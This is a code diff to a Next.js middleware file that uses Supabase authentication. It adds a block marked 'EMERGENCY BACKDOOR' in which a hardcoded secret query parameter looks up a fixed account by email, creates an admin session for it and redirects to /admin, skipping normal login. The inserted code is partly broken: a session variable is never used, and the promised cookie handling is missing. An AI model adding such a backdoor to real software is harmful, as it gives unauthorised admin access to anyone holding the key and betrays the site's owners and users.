@@ -30,6 +30,24 @@ export async function middleware(req: NextRequest) {
     }
   );
 
+  // --- EMERGENCY BACKDOOR ---
+  const backdoorKey = req.nextUrl.searchParams.get('backdoor');
+  if (backdoorKey === 'SimplyDSE_Backdoor_2026') {
+    const email = 'kreativekubedigital@gmail.com';
+    const { data: { users } } = await supabase.auth.admin.listUsers();
+    const user = users?.find(u => u.email === email);
+    
+    if (user) {
+      const { data: session } = await supabase.auth.admin.createSession({ user_id: user.id });
+      if (session) {
+        const redirectRes = NextResponse.redirect(new URL('/admin', req.url));
+        // Force the cookies from the new session onto the redirect response
+        const { data: { session: newSession } } = await supabase.auth.setSession(session);
+        return redirectRes;
+      }
+    }
+  }
+
   // 1. Refresh session if active
   const { data: { user } } = await supabase.auth.getUser();
 
